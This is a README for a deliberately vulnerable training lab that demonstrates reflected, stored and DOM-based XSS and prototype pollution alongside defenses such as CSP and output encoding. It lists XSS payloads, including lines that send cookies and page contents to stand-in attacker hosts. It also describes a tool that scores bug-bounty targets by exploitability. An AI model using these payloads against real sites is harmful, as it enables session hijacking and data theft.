# Client-Side Injection Training Lab

A comprehensive, full-stack training application designed to demonstrate client-side security vulnerabilities and their compensating controls. Built with Express.js, SQLite, and React, fully dockerized for easy deployment.

## 🎯 Purpose

This application provides hands-on experience with:
- **4 Major Attack Vectors:** Reflected XSS, Stored XSS, DOM-Based XSS, and Client-Side Prototype Pollution
- **6 Security Controls:** Client-side validation, Server-side validation, WAF, CSP, Output encoding, and Cookie flags

## 🚀 Quick Start

### Prerequisites
- Docker
- Docker Compose

### Running the Application

1. Clone the repository
2. Navigate to the project directory
3. Run with Docker Compose:

```bash
docker-compose up --build
```

4. Open your browser to `http://localhost:3000`

## 📚 Application Structure

### Vulnerability Demonstrations

#### 1. Reflected XSS (`/reflected`)
- **Attack Vector:** GET parameters in URL
- **How it works:** User input is immediately reflected in the HTTP response
- **Try it:** Add malicious scripts to URL parameters and see how different controls prevent execution

#### 2. Stored XSS (`/stored`)
- **Attack Vector:** POST requests storing data in database
- **How it works:** Malicious content is saved to the database and executed when other users view it
- **Try it:** Submit comments with XSS payloads and observe persistence

#### 3. DOM-Based XSS (`/dom-based`)
- **Attack Vector:** Hash fragments in URL
- **How it works:** Client-side JavaScript unsafely processes URL fragments
- **Try it:** Use hash fragments to inject scripts that are processed client-side

#### 4. Client-Side Prototype Pollution (`/prototype-pollution`)
- **Attack Vector:** Hash fragments with object property syntax
- **How it works:** Pollutes JavaScript Object.prototype, affecting all objects
- **Try it:** Inject properties that get inherited by all objects and exploited

### Security Controls

Each demonstration page allows you to configure the following controls:

1. **Client-Side Validation**
   - JavaScript validation before form submission
   - Can be bypassed by modifying requests
   - Useful for UX but not security

2. **Server-Side Validation**
   - Backend validation of input
   - Rejects dangerous patterns
   - Essential security layer

3. **Output Encoding**
   - HTML entity encoding of user input
   - Converts `<` to `&lt;`, etc.
   - Prevents script execution

4. **Web Application Firewall (WAF)**
   - Pattern-based request filtering
   - Blocks common attack signatures
   - Defense in depth

5. **Content Security Policy (CSP)**
   - Browser-level security restrictions
   - **Script Execution Controls:**
     - **Strict:** Only scripts from same origin (script-src 'self')
     - **Unsafe-inline:** Allows inline scripts (less secure)
     - **Nonce-based:** Scripts with specific nonce attribute
     - **No-unsafe:** Blocks eval and inline scripts
   - **Post-Exploitation Prevention:**
     - **Block Data Exfiltration:** Prevents fetch/XHR and form submissions (connect-src 'none', form-action 'none')
     - **Allow Self-Origin Only:** Only allows requests to same origin (connect-src 'self', form-action 'self')
     - **Block All Requests:** Prevents all outgoing requests (connect-src 'none')
     - **Block Form Submissions:** Prevents form posts to external domains (form-action 'none')

6. **Secure Cookie Flags**
   - HttpOnly: Prevents JavaScript access to cookies
   - Secure: Only transmits over HTTPS
   - SameSite: Prevents CSRF attacks

## 🧪 Example Payloads

### Basic XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### Event Handler XSS
```html
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
```

### Post-Exploitation Payloads
```html
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
<script>new Image().src='https://evil.com?session='+document.cookie</script>
<img src=x onerror="navigator.sendBeacon('https://attacker.com',document.cookie)">
<script>fetch('https://evil.com?data='+btoa(document.body.innerHTML))</script>
<form action="https://attacker.com" method="POST"><input name="data" value="stolen"></form><script>document.forms[0].submit()</script>
```

### Prototype Pollution
```
__proto__[innerHTML]=<img src=x onerror=alert('Polluted')>
constructor[prototype][xss]=<svg/onload=alert('PP-XSS')>
__proto__[onerror]=alert('Prototype Pollution')
```

## 🔍 Learning Objectives

1. **Understand Attack Vectors:** Learn how different XSS attacks work and where they originate
2. **Recognize Vulnerabilities:** Identify unsafe coding practices that lead to XSS
3. **Apply Defenses:** See which controls are effective against which attacks
4. **Defense in Depth:** Understand why multiple layers of security are necessary
5. **Post-Exploitation Prevention:** Learn how CSP can limit damage even after XSS is achieved
6. **Data Exfiltration:** Understand how attackers weaponize XSS for session hijacking and data theft
7. **CSP Directives:** Master different CSP policies and their effectiveness

## 🏗️ Technical Architecture

### Backend
- **Framework:** Express.js
- **Database:** SQLite (for stored XSS demonstration)
- **Middleware:** Custom WAF, CSP, and validation middleware

### Frontend
- **Base Pages:** HTML, CSS, vanilla JavaScript
- **Styling:** Custom CSS with responsive design

### Infrastructure
- **Containerization:** Docker
- **Orchestration:** Docker Compose
- **Port:** 3000

## 📁 Project Structure

```
├── server.js                    # Express server with all routes and middleware
├── package.json                 # Node.js dependencies
├── docker-compose.yml          # Docker Compose configuration
├── Dockerfile                  # Docker image definition
├── public/
│   ├── index.html             # Homepage
│   ├── styles.css             # Global styles
│   ├── dom-based.html         # DOM-based XSS demo
│   └── prototype-pollution.html # Prototype pollution demo
├── find-programs/              # Bug bounty target finder tool
│   ├── xss_target_finder.py   # Main Python script
│   ├── requirements.txt       # Python dependencies
│   └── README.md              # Tool documentation
└── README.md                   # This file
```

## 🎯 Bug Bounty Target Finder

The `find-programs/` directory contains a Python tool for identifying promising client-side injection targets on bug bounty platforms.

### Features

- **Platform Integration:** Fetches public programs from HackerOne and BugCrowd APIs
- **Technology Detection:** Identifies frameworks, JavaScript stacks, and security controls
- **Target Scoring:** Rates targets from 0-100 based on exploitability
- **Continuous Discovery:** Runs indefinitely to find new targets over time
- **Subdomain Enumeration:** Optional certificate transparency log scanning

### Quick Start

```bash
cd find-programs

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

export HACKERONE_API_KEY="identifier:token"
export BUGCROWD_API_KEY="your_api_key"

python xss_target_finder.py --reflected-stored
```

**Getting API Keys:**
- **HackerOne**: Go to Settings → API Tokens (https://hackerone.com/settings/api_token/edit)
  - Format: `identifier:token` (e.g., `abc123:1a2b3c4d5e`)
- **BugCrowd**: Go to Settings → API
  - Format: Just the token value

### Target Types

**Reflected/Stored XSS (`--reflected-stored`):**
- Targets without virtual DOM frameworks
- Traditional server-side rendered applications
- Simpler JavaScript implementations

**DOM-Based XSS (`--dom-based`):**
- Targets with significant custom JavaScript
- Applications with exposed webpack bundles
- Complex client-side implementations

### Output

The tool generates:
- `programs_*.json` - Complete program data
- `xss_targets_*.txt` - Scored targets (e.g., `https://example.com -- 85`)

See `find-programs/README.md` for complete documentation.

## ⚠️ Security Notice

**FOR EDUCATIONAL USE ONLY**

This application intentionally contains security vulnerabilities. It should NEVER be deployed to production or exposed to the public internet. Use only in:
- Isolated development environments
- Security training sessions
- Controlled testing scenarios

## 🛠️ Development

### Without Docker

```bash
npm install
npm start
```

### Environment Variables
- `PORT`: Server port (default: 3000)
- `NODE_ENV`: Environment mode (development/production)

## 📖 Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Prototype Pollution Attacks](https://portswigger.net/web-security/prototype-pollution)

## 🤝 Contributing

This is a training tool. Feel free to:
- Add new attack vectors
- Enhance existing demonstrations
- Improve documentation
- Add more security controls

## 📝 License

This project is for educational purposes. Use responsibly. 
